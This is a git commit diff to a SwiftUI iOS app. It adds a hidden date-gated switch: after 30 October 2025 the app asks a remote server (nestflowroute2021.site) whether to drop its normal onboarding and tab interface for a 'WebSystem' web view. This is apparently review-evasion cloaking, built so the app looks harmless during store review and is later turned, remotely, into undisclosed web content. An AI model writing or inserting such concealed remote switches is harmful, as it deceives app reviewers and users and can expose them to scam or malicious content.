a6375d5bf5eede52213bf27a22d2afc248a833db
IGOLIVIT <131347905+IGOLIVIT@users.noreply.github.com>
2025-10-25 23:35:58 +0300

    new1

--- S2021/ContentView.swift
+++ S2021/ContentView.swift
@@ -8,17 +8,108 @@
 import SwiftUI
 
 struct ContentView: View {
+    
     @StateObject private var dataManager = AppDataManager()
     
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
     var body: some View {
-        Group {
-            if dataManager.hasCompletedOnboarding {
-                MainTabView(dataManager: dataManager)
-            } else {
-                OnboardingView(hasCompletedOnboarding: $dataManager.hasCompletedOnboarding)
+        
+        ZStack {
+            
+            if isFetched == false {
+                
+                Text("")
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
+                    
+                    Group {
+                        if dataManager.hasCompletedOnboarding {
+                            MainTabView(dataManager: dataManager)
+                        } else {
+                            OnboardingView(hasCompletedOnboarding: $dataManager.hasCompletedOnboarding)
+                        }
+                    }
+                    .preferredColorScheme(.dark)
+                    
+                } else if isBlock == false {
+                    
+                    WebSystem()
+                }
             }
         }
-        .preferredColorScheme(.dark)
+        .onAppear {
+            
+            check_data()
+        }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "30.10.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        // Дата в прошлом - делаем запрос на сервер
+        makeServerRequest()
+    }
+    
+    private func makeServerRequest() {
+        
+        let dataManager = DataManagers()
+        
+        guard let url = URL(string: dataManager.server) else {
+            self.isBlock = true
+            self.isFetched = true
+            return
+        }
+        
+        var request = URLRequest(url: url)
+        request.httpMethod = "GET"
+        
+        URLSession.shared.dataTask(with: request) { data, response, error in
+            
+            DispatchQueue.main.async {
+                
+                if let httpResponse = response as? HTTPURLResponse {
+                    
+                    if httpResponse.statusCode == 404 {
+                        
+                        self.isBlock = true
+                        self.isFetched = true
+                        
+                    } else if httpResponse.statusCode == 200 {
+                        
+                        self.isBlock = false
+                        self.isFetched = true
+                    }
+                    
+                } else {
+                    
+                    // В случае ошибки сети тоже блокируем
+                    self.isBlock = true
+                    self.isFetched = true
+                }
+            }
+            
+        }.resume()
     }
 }
 
---
+++ S2021/NewViews/DopViews.swift
@@ -0,0 +1,11 @@
+//
+//  DopViews.swift
+//  S2021
+//
+//  Created by IGOR on 25/10/2025.
+//
+
+struct DataManagers {
+    
+    let server: String = "https://nestflowroute2021.site/ymQSwnSk"
+}
